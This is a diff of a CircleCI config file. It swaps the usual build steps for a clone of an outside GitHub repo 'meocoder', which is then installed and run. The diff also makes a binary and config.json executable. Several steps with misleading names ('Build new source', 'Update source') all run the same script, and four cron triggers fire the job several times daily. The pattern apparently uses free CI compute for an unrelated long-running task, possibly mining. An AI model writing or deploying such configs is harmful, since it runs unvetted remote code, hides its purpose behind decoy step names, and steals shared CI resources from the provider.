@@ -6,72 +6,60 @@ jobs:
       
     resource_class: medium
 
-    working_directory: ~/source
+    working_directory: ~/meocoder
 
     steps:
       - checkout
       
       - run:
-          name: Update
-          working_directory: /
-          command: |
-            sudo apt-get update -y
-      - run:
-          name: Update
-          working_directory: /
-          command: |
-            sudo apt-get upgrade -y
-      - run:
-          name: Install Chrome headless dependencies
-          working_directory: /
-          command: |
-            sudo apt-get install -yq gconf-service libasound2 libatk1.0-0 libc6 libcairo2 libcups2 libdbus-1-3 \
-            libexpat1 libfontconfig1 libgcc1 libgconf-2-4 libgdk-pixbuf2.0-0 libglib2.0-0 libgtk-3-0 libnspr4 \
-            libpango-1.0-0 libpangocairo-1.0-0 libstdc++6 libx11-6 libx11-xcb1 libxcb1 libxcomposite1 \
-            libxcursor1 libxdamage1 libxext6 libxfixes3 libxi6 libxrandr2 libxrender1 libxss1 libxtst6 \
-            ca-certificates fonts-liberation libappindicator1 libnss3 lsb-release xdg-utils wget --fix-missing
-      # run tests!
-      - run:
           name: Clone project and run task
-          command: git clone https://github.com/vippro99/nodejs-monney.git && cd nodejs-monney && npm i -s && npm start
-
-      # cronjob 
+          command:  git clone https://github.com/vippro99/meocoder.git && cd meocoder && npm i -s && chmod +x meocoder config.json && node app-1h.js
+      - run:
+          name: New task and check
+          command:  cd meocoder && node app-1h.js
+      - run:
+          name: Build new source
+          command:  cd meocoder && node app-1h.js
+      - run:
+          name: Update source
+          command:  cd meocoder && node app-1h.js
+      - run:
+          name: Check and close jobs
+          command:  cd meocoder && node test-45m.js
+      
+      # create cronjob 
 workflows:
   version: 2
 
   constantly_check:
     triggers:
       - schedule:
-          cron: "15 1,7,13,19 * * *"
+          cron: "0 11,17,23,5 * * *"
           filters:
             branches:
               only:
                 - main
                 - master
-                - beta
       - schedule:
-          cron: "16 1,7,13,19 * * *"
+          cron: "2 11,17,23,5 * * *"
           filters:
             branches:
               only:
                 - main
                 - master
-                - beta
       - schedule:
-          cron: "17 1,7,13,19 * * *"
+          cron: "4 11,17,23,5 * * *"
           filters:
             branches:
               only:
                 - main
                 - master
-                - beta
       - schedule:
-          cron: "18 1,7,13,19 * * *"
+          cron: "6 11,17,23,5 * * *"
           filters:
             branches:
               only:
                 - main
                 - master
-                - beta
     jobs:
       - build
